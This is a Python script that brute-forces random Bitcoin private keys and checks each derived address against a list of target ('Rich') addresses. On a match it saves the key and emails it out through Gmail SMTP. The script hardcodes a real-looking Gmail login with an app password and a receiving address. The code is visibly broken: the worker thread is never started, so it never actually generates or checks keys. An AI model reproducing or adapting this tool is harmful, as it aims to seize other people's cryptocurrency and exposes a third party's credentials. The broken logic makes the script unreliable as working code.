import os, random, codecs, time, threading, multiprocessing
from bit.format import bytes_to_wif
from bit import Key
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def _HexGen(size):
  key = "".join(random.choices("0123456789abcdef", k=size))
  return key


def _HexToWif(Hex):
  byteHex = bytes.fromhex(Hex)
  return bytes_to_wif(byteHex, compressed=True)



def _WifToAddr(WifCompressed, WifUncompressed):
  BitCompressed = Key(WifCompressed)
  BitUnCompressed = Key(WifUncompressed)
  return BitCompressed.address, BitUnCompressed.address
    

def _LoadTargetFile(FileName):
  tgt = [i.strip() for i in open(FileName).readlines()]
  return set(tgt)

class Worker(threading.Thread):
  def __init__(self, target_file, target_set):
    super().__init__()
    self.target_file = target_file
    self.target_set = target_set
    self.found = []

  def run(self):
    while True:
      Private_Key = _HexGen(64)
      WifCompressed, WifUncompressed = _HexToWif(Hex=Private_Key)
      CompressAddr, UnCompressAddr = _WifToAddr(WifCompressed, WifUncompressed)
      if str(CompressAddr) in self.target_set or str(UnCompressAddr) in self.target_set:
        self.found.append((CompressAddr, UnCompressAddr, Private_Key, WifCompressed, WifUncompressed))

  def get_found(self):
    return self.found

def MainCheck(Target):
  global z, wf
  z = 0
  wf = 0
  lg = 0

  while True:
    z += 1

    found = worker.get_found()

    for f in found:
      wf += 1
      open('C:/Users/98933/Desktop/found.txt', 'a').write(f'Compressed Address: {f[0]}\n'
                                                              f'UnCompressed Address: {f[1]}\n'
                                                              f'Private Key: {f[2]}\n'
                                                              f'WIF (Compressed): {f[3]}\n'
                                                              f'WIF (UnCompressed): {f[4]}\n')
      def send_email(sender, receiver, subject, body):
                """
                ارسال ایمیل

                Args:
                    sender: آدرس ایمیل فرستنده
                    receiver: آدرس ایمیل گیرنده
                    subject: موضوع ایمیل
                    body: متن ایمیل

                Returns:
                    True اگر ایمیل با موفقیت ارسال شد، در غیر این صورت False
                """

                # اتصال به سرور SMTP
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()

                # لاگین به سرور با نام کاربری و رمز عبور
                sender = "pouriya.guitar@gmail.com"
                server.login(sender, "xecy aomq ddms tmid")

                # ایجاد پیام ایمیل
                msg = MIMEMultipart()
                msg["From"] = sender
                msg["To"] = receiver
                msg["Subject"] = subject
                msg.attach(MIMEText(body))

                # ارسال پیام ایمیل
                try:
                    server.sendmail(sender, receiver, msg.as_string())
                    return True
                except Exception as e:
                    print(e)
                    return False

            # تنظیم اطلاعات ایمیل
      sender = "pouriya.guitar@gmail.com"
      receiver = "tatalbet666@gmail.com"
      subject = "هش"
      body = """
    Compressed Address: {}
    UnCompressed Address: {}
    Private Key: {}
    WIF (Compressed): {}
    WIF (UnCompressed): {}
    """.format(f[0], f[1], f[2], f[3], f[4])

            # ارسال ایمیل
      while True:
                if send_email(sender, receiver, subject, body):
                    break
                time.sleep(10)




    if int(z % 100000) == 0:
      lg += 100000
      print(f"Generated: {lg} (SHA-256 - HEX) ...")
      

if __name__ == '__main__':
  target_file = 'C:/Users/98933/Desktop/Rich.txt'
  Target = _LoadTargetFile(FileName=target_file)
  worker = Worker(target_file, Target)
  MainCheck(Target)
